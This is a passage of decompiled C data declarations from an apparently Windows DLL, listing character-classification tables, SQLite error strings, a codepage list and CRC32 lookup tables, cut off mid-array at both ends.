  'i',
  'j',
  'k',
  'l',
  'm',
  'n',
  'o',
  'p',
  'q',
  'r',
  's',
  't',
  'u',
  'v',
  'w',
  'x',
  'y',
  'z',
  '{',
  '|',
  '}',
  '~',
  '\x7F',
  '\x80',
  '\x81',
  '\x82',
  '\x83',
  '\x84',
  '\x85',
  '\x86',
  '\x87',
  '\x88',
  '\x89',
  '\x8A',
  '\x8B',
  '\x8C',
  '\x8D',
  '\x8E',
  '\x8F',
  '\x90',
  '\x91',
  '\x92',
  '\x93',
  '\x94',
  '\x95',
  '\x96',
  '\x97',
  '\x98',
  '\x99',
  '\x9A',
  '\x9B',
  '\x9C',
  '\x9D',
  '\x9E',
  '\x9F',
  '\xA0',
  '\xA1',
  '\xA2',
  '\xA3',
  '\xA4',
  '\xA5',
  '\xA6',
  '\xA7',
  '\xA8',
  '\xA9',
  '\xAA',
  '\xAB',
  '\xAC',
  '\xAD',
  '\xAE',
  '\xAF',
  '\xB0',
  '\xB1',
  '\xB2',
  '\xB3',
  '\xB4',
  '\xB5',
  '\xB6',
  '\xB7',
  '\xB8',
  '\xB9',
  '\xBA',
  '\xBB',
  '\xBC',
  '\xBD',
  '\xBE',
  '\xBF',
  '\xC0',
  '\xC1',
  '\xC2',
  '\xC3',
  '\xC4',
  '\xC5',
  '\xC6',
  '\xC7',
  '\xC8',
  '\xC9',
  '\xCA',
  '\xCB',
  '\xCC',
  '\xCD',
  '\xCE',
  '\xCF',
  '\xD0',
  '\xD1',
  '\xD2',
  '\xD3',
  '\xD4',
  '\xD5',
  '\xD6',
  '\xD7',
  '\xD8',
  '\xD9',
  '\xDA',
  '\xDB',
  '\xDC',
  '\xDD',
  '\xDE',
  '\xDF',
  '\xE0',
  '\xE1',
  '\xE2',
  '\xE3',
  '\xE4',
  '\xE5',
  '\xE6',
  '\xE7',
  '\xE8',
  '\xE9',
  '\xEA',
  '\xEB',
  '\xEC',
  '\xED',
  '\xEE',
  '\xEF',
  '\xF0',
  '\xF1',
  '\xF2',
  '\xF3',
  '\xF4',
  '\xF5',
  '\xF6',
  '\xF7',
  '\xF8',
  '\xF9',
  '\xFA',
  '\xFB',
  '\xFC',
  '\xFD',
  '\xFE',
  '\xFF'
}; // weak
char byte_100FEFC0[256] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x01',
  '\0',
  '\0',
  '\0',
  '@',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\0',
  '\0',
  '\0',
  '\0',
  '@',
  '\0',
  '*',
  '*',
  '*',
  '*',
  '*',
  '*',
  '\"',
  '\"',
  '\"',
  '\"',
  '\"',
  '\"',
  '\"',
  '\"',
  '\"',
  '\"',
  '\"',
  '\"',
  '\"',
  '\"',
  '\"',
  '\"',
  '\"',
  '\"',
  '\"',
  '\"',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@',
  '@'
}; // weak
char byte_100FF0C0[148] =
{
  '\0',
  '\x01',
  '\x05',
  '\x04',
  '\x04',
  '\x10',
  '\0',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\0',
  '\0',
  '$',
  '$',
  '\0',
  '\0',
  '\0',
  '$',
  '\x04',
  '\x05',
  '\x04',
  '\0',
  '\0',
  '\x01',
  '\x05',
  '\x05',
  '\0',
  '\0',
  '\0',
  '\x02',
  '\0',
  '\0',
  '\0',
  '\x02',
  '\x10',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x11',
  '\x11',
  '\x11',
  '\x11',
  '\b',
  '\x11',
  '\x11',
  '\x11',
  '\x11',
  '\x02',
  '\x02',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x02',
  '\0',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\b',
  'L',
  'L',
  '\0',
  '\x02',
  '\x01',
  '\x05',
  '\x05',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x01',
  'L',
  'L',
  'L',
  'L',
  'L',
  'L',
  'L',
  'L',
  'L',
  'L',
  '\x02',
  '$',
  '\x02',
  '\0',
  '\x02',
  '\x02',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\f',
  'E',
  '\x15',
  '\x01',
  '\x02',
  '\0',
  '\x01',
  '\b',
  '\x05',
  '\x05',
  '\x05',
  '\0',
  '\0',
  '\0',
  '\x01',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x01',
  '\0',
  '\x01',
  '\0',
  '\0',
  '\x02',
  '\x02',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x04',
  '\x04',
  '\x04',
  '\x04',
  '\x04',
  '\0',
  '\0'
}; // weak
char byte_100FF154[16] =
{
  '\0',
  '\x01',
  '\x02',
  '\x01',
  '\x01',
  '\x01',
  '\x02',
  '\x01',
  '\x02',
  '\0',
  '\0',
  '\0',
  '\x1E',
  '\x04',
  '\0',
  '\0'
}; // weak
char byte_100FF164[28] =
{
  '\0',
  '\x01',
  '\x02',
  '\x03',
  '\x04',
  '\x06',
  '\b',
  '\b',
  '\0',
  '\0',
  '\0',
  '\0',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x7F',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x80'
}; // weak
char a0123456789abcd[33] = "0123456789ABCDEF0123456789abcdef"; // weak
char aX0[4] = "-x0"; // weak
_UNKNOWN unk_100FF288; // weak
_UNKNOWN unk_100FF312; // weak
char byte_100FF334[] = { 't' }; // weak
char byte_100FF335[] = { 'h' }; // weak
char *off_100FF348[2] = { "not an error", "SQL logic error or missing database" }; // weak
_UNKNOWN unk_100FF438; // weak
_UNKNOWN unk_100FF468; // weak
_UNKNOWN unk_100FF490; // weak
char byte_100FF510[264] =
{
  'G',
  '\xF1',
  '\xB4',
  '\xE6',
  '\v',
  'j',
  'r',
  'H',
  '\x85',
  'N',
  '\x9E',
  '\xEB',
  '\xE2',
  '\xF8',
  '\x94',
  'S',
  '\xE0',
  '\xBB',
  '\xA0',
  '\x02',
  '\xE8',
  'Z',
  '\t',
  '\xAB',
  '\xDB',
  '\xE3',
  '\xBA',
  '\xC6',
  '|',
  '\xC3',
  '\x10',
  '\xDD',
  '9',
  '\x05',
  '\x96',
  '0',
  '\xF5',
  '7',
  '`',
  '\x82',
  '\x8C',
  '\xC9',
  '\x13',
  'J',
  'k',
  '\x1D',
  '\xF3',
  '\xFB',
  '\x8F',
  '&',
  '\x97',
  '\xCA',
  '\x91',
  '\x17',
  '\x01',
  '\xC4',
  '2',
  '-',
  'n',
  '1',
  '\x95',
  '\xFF',
  '\xD9',
  '#',
  '\xD1',
  '\0',
  '^',
  'y',
  '\xDC',
  'D',
  ';',
  '\x1A',
  '(',
  '\xC5',
  'a',
  'W',
  ' ',
  '\x90',
  '=',
  '\x83',
  '\xB9',
  'C',
  '\xBE',
  'g',
  '\xD2',
  'F',
  'B',
  'v',
  '\xC0',
  'm',
  '[',
  '~',
  '\xB2',
  '\x0F',
  '\x16',
  ')',
  '<',
  '\xA9',
  '\x03',
  'T',
  '\r',
  '\xDA',
  ']',
  '\xDF',
  '\xF6',
  '\xB7',
  '\xC7',
  'b',
  '\xCD',
  '\x8D',
  '\x06',
  '\xD3',
  'i',
  '\\',
  '\x86',
  '\xD6',
  '\x14',
  '\xF7',
  '\xA5',
  'f',
  'u',
  '\xAC',
  '\xB1',
  '\xE9',
  'E',
  '!',
  'p',
  '\f',
  '\x87',
  '\x9F',
  't',
  '\xA4',
  '\"',
  'L',
  'o',
  '\xBF',
  '\x1F',
  'V',
  '\xAA',
  '.',
  '\xB3',
  'x',
  '3',
  'P',
  '\xB0',
  '\xA3',
  '\x92',
  '\xBC',
  '\xCF',
  '\x19',
  '\x1C',
  '\xA7',
  'c',
  '\xCB',
  '\x1E',
  'M',
  '>',
  'K',
  '\x1B',
  '\x9B',
  'O',
  '\xE7',
  '\xF0',
  '\xEE',
  '\xAD',
  ':',
  '\xB5',
  'Y',
  '\x04',
  '\xEA',
  '@',
  'U',
  '%',
  'Q',
  '\xE5',
  'z',
  '\x89',
  '8',
  'h',
  'R',
  '{',
  '\xFC',
  '\'',
  '\xAE',
  '\xD7',
  '\xBD',
  '\xFA',
  '\a',
  '\xF4',
  '\xCC',
  '\x8E',
  '_',
  '\xEF',
  '5',
  '\x9C',
  '\x84',
  '+',
  '\x15',
  '\xD5',
  'w',
  '4',
  'I',
  '\xB6',
  '\x12',
  '\n',
  '\x7F',
  'q',
  '\x88',
  '\xFD',
  '\x9D',
  '\x18',
  'A',
  '}',
  '\x93',
  '\xD8',
  'X',
  ',',
  '\xCE',
  '\xFE',
  '$',
  '\xAF',
  '\xDE',
  '\xB8',
  '6',
  '\xC8',
  '\xA1',
  '\x80',
  '\xA6',
  '\x99',
  '\x98',
  '\xA8',
  '/',
  '\x0E',
  '\x81',
  'e',
  's',
  '\xE4',
  '\xC2',
  '\xA2',
  '\x8A',
  '\xD4',
  '\xE1',
  '\x11',
  '\xD0',
  '\b',
  '\x8B',
  '*',
  '\xF2',
  '\xED',
  '\x9A',
  'd',
  '?',
  '\xC1',
  'l',
  '\xF9',
  '\xEC',
  '\x17',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '?'
}; // weak
_UNKNOWN unk_100FF618; // weak
_UNKNOWN unk_100FF658; // weak
int dword_100FF69C[] = { 12 }; // weak
int dword_100FF6B8[] = { 0 }; // weak
int dword_100FF6BC[104] =
{
  1252,
  1,
  0,
  204,
  1251,
  238,
  1250,
  162,
  1254,
  186,
  1257,
  178,
  1256,
  128,
  932,
  77,
  68,
  66,
  7102806,
  1668443974,
  1835356773,
  6649455,
  1699901262,
  1702260589,
  0,
  1701602628,
  25972,
  1701869908,
  6449484,
  1952870227,
  1701994871,
  0,
  1414748499,
  19781,
  1430472019,
  1498696018,
  0,
  5062995,
  1701669197,
  0,
  1685217608,
  1701994871,
  0,
  1702129225,
  1667327602,
  101,
  1701603654,
  1701869908,
  0,
  1886220099,
  1852141167,
  1631789172,
  1869047156,
  1936025970,
  0,
  1230195779,
  68,
  1232105537,
  68,
  83,
  77,
  68,
  66,
  7102806,
  1668443974,
  1835356773,
  6649455,
  1699901262,
  1702260589,
  0,
  1701602628,
  25972,
  1701869908,
  6449484,
  1952870227,
  1701994871,
  0,
  1414748499,
  19781,
  1430472019,
  1498696018,
  0,
  5062995,
  1701669197,
  0,
  1685217608,
  1701994871,
  0,
  1702129225,
  1667327602,
  101,
  1701603654,
  1701869908,
  0,
  1886220099,
  1852141167,
  1631789172,
  1869047156,
  1936025970,
  0,
  1230195779,
  68,
  1232105537,
  68
}; // weak
_UNKNOWN unk_100FF85C; // weak
_UNKNOWN unk_100FF884; // weak
_UNKNOWN unk_100FF894; // weak
_UNKNOWN unk_100FF898; // weak
int dword_100FF8A0[256] =
{
  0,
  1996959894,
  -301047508,
  -1727442502,
  124634137,
  1886057615,
  -379345611,
  -1637575261,
  249268274,
  2044508324,
  -522852066,
  -1747789432,
  162941995,
  2125561021,
  -407360249,
  -1866523247,
  498536548,
  1789927666,
  -205950648,
  -2067906082,
  450548861,
  1843258603,
  -187386543,
  -2083289657,
  325883990,
  1684777152,
  -43845254,
  -1973040660,
  335633487,
  1661365465,
  -99664541,
  -1928851979,
  997073096,
  1281953886,
  -715111964,
  -1570279054,
  1006888145,
  1258607687,
  -770865667,
  -1526024853,
  901097722,
  1119000684,
  -608450090,
  -1396901568,
  853044451,
  1172266101,
  -589951537,
  -1412350631,
  651767980,
  1373503546,
  -925412992,
  -1076862698,
  565507253,
  1454621731,
  -809855591,
  -1195530993,
  671266974,
  1594198024,
  -972236366,
  -1324619484,
  795835527,
  1483230225,
  -1050600021,
  -1234817731,
  1994146192,
  31158534,
  -1731059524,
  -271249366,
  1907459465,
  112637215,
  -1614814043,
  -390540237,
  2013776290,
  251722036,
  -1777751922,
  -519137256,
  2137656763,
  141376813,
  -1855689577,
  -429695999,
  1802195444,
  476864866,
  -2056965928,
  -228458418,
  1812370925,
  453092731,
  -2113342271,
  -183516073,
  1706088902,
  314042704,
  -1950435094,
  -54949764,
  1658658271,
  366619977,
  -1932296973,
  -69972891,
  1303535960,
  984961486,
  -1547960204,
  -725929758,
  1256170817,
  1037604311,
  -1529756563,
  -740887301,
  1131014506,
  879679996,
  -1385723834,
  -631195440,
  1141124467,
  855842277,
  -1442165665,
  -586318647,
  1342533948,
  654459306,
  -1106571248,
  -921952122,
  1466479909,
  544179635,
  -1184443383,
  -832445281,
  1591671054,
  702138776,
  -1328506846,
  -942167884,
  1504918807,
  783551873,
  -1212326853,
  -1061524307,
  -306674912,
  -1698712650,
  62317068,
  1957810842,
  -355121351,
  -1647151185,
  81470997,
  1943803523,
  -480048366,
  -1805370492,
  225274430,
  2053790376,
  -468791541,
  -1828061283,
  167816743,
  2097651377,
  -267414716,
  -2029476910,
  503444072,
  1762050814,
  -144550051,
  -2140837941,
  426522225,
  1852507879,
  -19653770,
  -1982649376,
  282753626,
  1742555852,
  -105259153,
  -1900089351,
  397917763,
  1622183637,
  -690576408,
  -1580100738,
  953729732,
  1340076626,
  -776247311,
  -1497606297,
  1068828381,
  1219638859,
  -670225446,
  -1358292148,
  906185462,
  1090812512,
  -547295293,
  -1469587627,
  829329135,
  1181335161,
  -882789492,
  -1134132454,
  628085408,
  1382605366,
  -871598187,
  -1156888829,
  570562233,
  1426400815,
  -977650754,
  -1296233688,
  733239954,
  1555261956,
  -1026031705,
  -1244606671,
  752459403,
  1541320221,
  -1687895376,
  -328994266,
  1969922972,
  40735498,
  -1677130071,
  -351390145,
  1913087877,
  83908371,
  -1782625662,
  -491226604,
  2075208622,
  213261112,
  -1831694693,
  -438977011,
  2094854071,
  198958881,
  -2032938284,
  -237706686,
  1759359992,
  534414190,
  -2118248755,
  -155638181,
  1873836001,
  414664567,
  -2012718362,
  -15766928,
  1711684554,
  285281116,
  -1889165569,
  -127750551,
  1634467795,
  376229701,
  -1609899400,
  -686959890,
  1308918612,
  956543938,
  -1486412191,
  -799009033,
  1231636301,
  1047427035,
  -1362007478,
  -640263460,
  1088359270,
  936918000,
  -1447252397,
  -558129467,
  1202900863,
  817233897,
  -1111625188,
  -893730166,
  1404277552,
  615818150,
  -1160759803,
  -841546093,
  1423857449,
  601450431,
  -1285129682,
  -1000256840,
  1567103746,
  711928724,
  -1274298825,
  -1022587231,
  1510334235,
  755167117
}; // weak
int dword_100FFCA0[256] =
{
  0,
  421212481,
  842424962,
  724390851,
  1684849924,
  2105013317,
  1448781702,
  1329698503,
  -925267448,
  -775767223,
  -84940662,
  -470492725,
  -1397403892,
  -1246855603,
  -1635570290,
  -2020074289,
  1254232657,
  1406739216,
  2029285587,
  1643069842,
  783210325,
  934667796,
  479770071,
  92505238,
  -2112120743,
  -1694455528,
  -1339163941,
  -1456026726,
  -428384931,
  -9671652,
  -733921313,
  -849736034,
  -1786501982,
  -1935731229,
  -1481488864,
  -1096190111,
  -236396122,
  -386674457,
  -1008827612,
  -624577947,
  1566420650,
  1145479147,
  1869335592,
  1987116393,
  959540142,
  539646703,
  185010476,
  303839341,
  -549046541,
  -966981710,
  -311405455,
  -194288336,
  -1154812937,
  -1573797194,
  -1994616459,
  -1878548428,
  396344571,
  243568058,
  631889529,
  1018359608,
  1945336319,
  1793607870,
  1103436669,
  1490954812,
  -260485371,
  -379421116,
  -1034998393,
  -615244602,
  -1810527743,
  -1928414400,
  -1507596157,
  -1086793278,
  950060301,
  565965900,
  177645455,
  328046286,
  1556873225,
  1171730760,
  1861902987,
  2011255754,
  -1162125996,
  -1549767659,
  -2004009002,
  -1852436841,
  -556296112,
  -942888687,
  -320734510,
  -168113261,
  1919080284,
  1803150877,
  1079293406,
  1498383519,
  370020952,
  253043481,
  607678682,
  1025720731,
  1711106983,
  2095471334,
  1472923941,
  1322268772,
  26324643,
  411738082,
  866634785,
  717028704,
  -1390091857,
  -1270886162,
  -1626176723,
  -2046184852,
  -918018901,
  -799861270,
  -75610583,
  -496666776,
  792689142,
  908347575,
  487136116,
  68299317,
  1263779058,
  1380486579,
  2036719216,
  1618931505,
  -404294658,
  -16923969,
  -707751556,
  -859070403,
  -2088093958,
  -1701771333,
  -1313057672,
  -1465424583,
  998479947,
  580430090,
  162921161,
  279890824,
  1609522511,
  1190423566,
  1842954189,
  1958874764,
  -212200893,
  -364829950,
  -1049857855,
  -663273088,
  -1758013625,
  -1909594618,
  -1526680123,
  -1139047292,
  1900120602,
  1750776667,
  1131931800,
  1517083097,
  355290910,
  204897887,
  656092572,
  1040194781,
  -1181220846,
  -1602014893,
  -1951505776,
  -1833610287,
  -571161322,
  -990907305,
  -272455788,
  -153512235,
  -1375224599,
  -1222865496,
  -1674453397,
  -2060783830,
  -898926099,
  -747616084,
  -128115857,
  -515495378,
  1725839073,
  2143618976,
  1424512099,
  1307796770,
  45282277,
  464110244,
  813994343,
  698327078,
  -456806728,
  -35741703,
  -688665542,
  -806814341,
  -2136380484,
  -1716364547,
  -1298200258,
  -1417398145,
  740041904,
  889656817,
  506086962,
  120682355,
  1215357364,
  1366020341,
  2051441462,
  1667084919,
  -872753330,
  -756947441,
  -104024628,
  -522746739,
  -1349119414,
  -1232264437,
  -1650429752,
  -2068102775,
  52649286,
  439905287,
  823476164,
  672009861,
  1733269570,
  2119477507,
  1434057408,
  1281543041,
  -2126985953,
  -1742474146,
  -1290885219,
  -1441425700,
  -447479781,
  -61918886,
  -681418087,
  -830909480,
  1239502615,
  1358593622,
  2077699477,
  1657543892,
  764250643,
  882293586,
  532408465,
  111204816,
  1585378284,
  1197851309,
  1816695150,
  1968414767,
  974272232,
  587794345,
  136598634,
  289367339,
  -1767409180,
  -1883486043,
  -1533994138,
  -1115018713,
  -221528864,
  -338653791,
  -1057104286,
  -639176925,
  347922877,
  229101820,
  646611775,
  1066513022,
  1892689081,
  1774917112,
  1122387515,
  1543337850,
  -597333067,
  -981574924,
  -296548041,
  -146261898,
  -1207325007,
  -1592614928,
  -1975530445,
  -1826292366
}; // weak
int dword_101000A0[256] =
{
  0,
  29518391,
  59036782,
  38190681,
  118073564,
  114017003,
  76381362,
  89069189,
  236147128,
  265370511,
  228034006,
  206958561,
  152762724,
  148411219,
  178138378,
  190596925,
  472294256,
  501532999,
  530741022,
  509615401,
  456068012,
  451764635,
  413917122,
  426358261,
  305525448,
  334993663,
  296822438,
  275991697,
  356276756,
  352202787,
  381193850,
  393929805,
  944588512,
  965684439,
  1003065998,
  973863097,
  1061482044,
  1049003019,
  1019230802,
  1023561829,
  912136024,
  933002607,
  903529270,
  874031361,
  827834244,
  815125939,
  852716522,
  856752605,
  611050896,
  631869351,
  669987326,
  640506825,
  593644876,
  580921211,
  551983394,
  556069653,
  712553512,
  733666847,
  704405574,
  675154545,
  762387700,
  749958851,
  787859610,
  792175277,
  1889177024,
  1901651959,
  1931368878,
  1927033753,
  2006131996,
  1985040171,
  1947726194,
  1976933189,
  2122964088,
  2135668303,
  2098006038,
  2093965857,
  2038461604,
  2017599123,
  2047123658,
  2076625661,
  1824272048,
  1836991623,
  1866005214,
  1861914857,
  1807058540,
  1786244187,
  1748062722,
  1777547317,
  1655668488,
  1668093247,
  1630251878,
  1625932113,
  1705433044,
  1684323811,
  1713505210,
  1742760333,
  1222101792,
  1226154263,
  1263738702,
  1251046777,
  1339974652,
  1310460363,
  1281013650,
  1301863845,
  1187289752,
  1191637167,
  1161842422,
  1149379777,
  1103966788,
  1074747507,
  1112139306,
  1133218845,
  1425107024,
  1429406311,
  1467333694,
  1454888457,
  1408811148,
  1379576507,
  1350309090,
  1371438805,
  1524775400,
  1528845279,
  1499917702,
  1487177649,
  1575719220,
  1546255107,
  1584350554,
  1605185389,
  -516613248,
  -520654409,
  -491663378,
  -478960167,
  -432229540,
  -402728597,
  -440899790,
  -461763323,
  -282703304,
  -287039473,
  -324886954,
  -312413087,
  -399514908,
  -370308909,
  -341100918,
  -362193731,
  -49039120,
  -53357881,
  -23630690,
  -11204951,
  -98955220,
  -69699045,
  -107035582,
  -128143755,
  -218044088,
  -222133377,
  -259769050,
  -247048431,
  -200719980,
  -171234397,
  -141715974,
  -162529331,
  -646423200,
  -658884777,
  -620984050,
  -616635591,
  -562956868,
  -541876341,
  -571137582,
  -600355867,
  -680850216,
  -693541137,
  -722478922,
  -718425471,
  -798841852,
  -777990605,
  -739872662,
  -769385891,
  -983630320,
  -996371417,
  -958780802,
  -954711991,
  -1034463540,
  -1013629701,
  -1043103070,
  -1072568171,
  -884101208,
  -896547425,
  -926319674,
  -922021391,
  -867956876,
  -846828221,
  -809446630,
  -838682323,
  -1850763712,
  -1871840137,
  -1842658770,
  -1813436391,
  -1767489892,
  -1755032405,
  -1792873742,
  -1797226299,
  -1615017992,
  -1635865137,
  -1674046570,
  -1644529247,
  -1732939996,
  -1720253165,
  -1691239606,
  -1695297155,
  -1920387792,
  -1941217529,
  -1911692962,
  -1882223767,
  -1971282452,
  -1958545445,
  -1996207742,
  -2000280651,
  -2087033720,
  -2108158273,
  -2145472282,
  -2116232495,
  -2070688684,
  -2058246557,
  -2028529606,
  -2032831987,
  -1444753248,
  -1474250089,
  -1436154674,
  -1415287047,
  -1360299908,
  -1356262837,
  -1385190382,
  -1397897691,
  -1477345000,
  -1506546897,
  -1535814282,
  -1514717375,
  -1594349116,
  -1590017037,
  -1552089686,
  -1564567651,
  -1245416496,
  -1274668569,
  -1237276738,
  -1216164471,
  -1295131892,
  -1290817221,
  -1320611998,
  -1333041835,
  -1143528856,
  -1173010337,
  -1202457082,
  -1181639631,
  -1126266188,
  -1122180989,
  -1084596518,
  -1097321235
}; // weak
int dword_101004A0[1280] =
{
  0,
  -1195612315,
  -1442199413,
  313896942,
  -1889364137,
  937357362,
  627793884,
  -1646839623,
  -978048785,
  2097696650,
  1874714724,
  -687765759,
  1255587768,
  -227878691,
  -522225869,
  1482887254,
  1343838111,
  -391827206,
  -99573996,
  1118632049,
  -545537848,
  1741137837,
  1970407491,
  -842109146,
  -1783791760,
  756094997,
  1067759611,
  -2028416866,
  449832999,
  -1569484990,
  -1329192788,
  142231497,
  -1607291074,
  412010587,
  171665333,
  -1299775280,
  793786473,
  -1746116852,
  -2057703198,
  1038456711,
  1703315409,
  -583343948,
  -812691622,
  1999841343,
  -354152314,
  1381529571,
  1089329165,
  -128860312,
  -265553759,
  1217896388,
  1512189994,
  -492939441,
  2135519222,
  -940242797,
  -717183107,
  1845280792,
  899665998,
  -1927039189,
  -1617553211,
  657096608,
  -1157806311,
  37822588,
  284462994,
  -1471616777,
  -1693165507,
  598228824,
  824021174,
  -1985873965,
  343330666,
  -1396004849,
  -1098971167,
  113467524,
  1587572946,
  -434366537,
  -190203815,
  1276501820,
  -775755899,
  1769898208,
  2076913422,
  -1015592853,
  -888336478,
  1941006535,
  1627703081,
  -642211764,
  1148164341,
  -53215344,
  -295284610,
  1457141531,
  247015245,
  -1241169880,
  -1531908154,
  470583459,
  -2116308966,
  963106687,
  735213713,
  -1821499404,
  992409347,
  -2087022490,
  -1859174520,
  697522413,
  -1270587308,
  217581361,
  508405983,
  -1494102086,
  -23928852,
  1177467017,
  1419450215,
  -332959742,
  1911572667,
  -917753890,
  -604405712,
  1665525589,
  1799331996,
  -746338311,
  -1053399017,
  2039091058,
  -463652917,
  1558270126,
  1314193216,
  -152528859,
  -1366587277,
  372764438,
  75645176,
  -1136777315,
  568925988,
  -1722451903,
  -1948198993,
  861712586,
  -312887749,
  1441124702,
  1196457648,
  -1304107,
  1648042348,
  -628668919,
  -936187417,
  1888390786,
  686661332,
  -1873675855,
  -2098964897,
  978858298,
  -1483798141,
  523464422,
  226935048,
  -1254447507,
  -1119821404,
  100435649,
  390670639,
  -1342878134,
  841119475,
  -1969352298,
  -1741963656,
  546822429,
  2029308235,
  -1068978642,
  -755170880,
  1782671013,
  -141140452,
  1328167289,
  1570739863,
  -450629134,
  1298864389,
  -170426784,
  -412954226,
  1608431339,
  -1039561134,
  2058742071,
  1744848601,
  -792976964,
  -1998638614,
  811816591,
  584513889,
  -1704288764,
  129869501,
  -1090403880,
  -1380684234,
  352848211,
  494030490,
  -1513215489,
  -1216641519,
  264757620,
  -1844389427,
  715964072,
  941166918,
  -2136639965,
  -658086283,
  1618608400,
  1926213374,
  -898381413,
  1470427426,
  -283601337,
  -38979159,
  1158766284,
  1984818694,
  -823031453,
  -599513459,
  1693991400,
  -114329263,
  1100160564,
  1395044826,
  -342174017,
  -1275476247,
  189112716,
  435162722,
  -1588827897,
  1016811966,
  -2077804837,
  -1768777419,
  774831696,
  643086745,
  -1628905732,
  -1940033262,
  887166583,
  -1456066866,
  294275499,
  54519365,
  -1149009632,
  -471821962,
  1532818963,
  1240029693,
  -246071656,
  1820460577,
  -734109372,
  -963916118,
  2117577167,
  -696303304,
  1858283101,
  2088143283,
  -993333546,
  1495127663,
  -509497078,
  -216785180,
  1269332353,
  332098007,
  -1418260814,
  -1178427044,
  25085497,
  -1666580864,
  605395429,
  916469259,
  -1910746770,
  -2040129881,
  1054503362,
  745528876,
  -1798063799,
  151290352,
  -1313282411,
  -1559410309,
  464596510,
  1137851976,
  -76654291,
  -371460413,
  1365741990,
  -860837601,
  1946996346,
  1723425172,
  -570095887,
  0,
  -1775237257,
  744558318,
  -1169094247,
  432303367,
  -1879807376,
  900031465,
  -1550490466,
  847829774,
  -1531388807,
  518641120,
  -1998990697,
  726447625,
  -1115901570,
  120436967,
  -1860321392,
  1678817053,
  -232738710,
  1215412723,
  -566116732,
  2111101466,
  -337322643,
  1370871028,
  -947530877,
  1452829715,
  -1062704284,
  2063164157,
  -322345590,
  1331429652,
  -647231901,
  1664946170,
  -183695219,
  -937398725,
  1578133836,
  -465477419,
  1920034722,
  -773586116,
  1205077067,
  -41611822,
  1807026853,
  -89606859,
  1821946434,
  -691422245,
  1090108588,
  -479406030,
  1969020741,
  -821176612,
  1497223595,
  -1406084826,
  973135441,
  -2142119992,
  375509183,
  -1242254303,
  600093526,
  -1718240561,
  262520248,
  -1632107992,
  143131999,
  -1294398266,
  619252657,
  -2021888209,
  290220120,
  -1424137791,
  1026385590,
  -1874731914,
  108124929,
  -1138699624,
  705746415,
  -1987726991,
  532002310,
  -1511735393,
  869578984,
  -1563883656,
  888733711,
  -1901590122,
  412618465,
  -1156748673,
  759000328,
  -1754504047,
  22832102,
  -195990677,
  1650551836,
  -667916923,
  1308648178,
  -309000596,
  2074411291,
  -1040971646,
  1472466933,
  -958812059,
  1357494034,
  -356991349,
  2089335292,
  -551690910,
  1227741717,
  -209923188,
  1699534075,
  1482797645,
  -833505990,
  1946205347,
  -500122668,
  1101389642,
  -678045635,
  1841615268,
  -67840301,
  1793681731,
  -52859340,
  1183344557,
  -793222950,
  1932330052,
  -451083469,
  1598818986,
  -914616867,
  1014039888,
  -1438580185,
  269487038,
  -2044719927,
  632645719,
  -1283100896,
  164914873,
  -1612422706,
  251256414,
  -1731602135,
  580440240,
  -1264003129,
  389919577,
  -2129808338,
  995933623,
  -1385383232,
  545503469,
  -1229733990,
  216184323,
  -1697468044,
  961009130,
  -1351101795,
  354867972,
  -2095653773,
  302736355,
  -2076482412,
  1047162125,
  -1470469510,
  198119140,
  -1644230253,
  665714698,
  -1315043459,
  1150488560,
  -761067385,
  1760690462,
  -20838807,
  1566008055,
  -882416256,
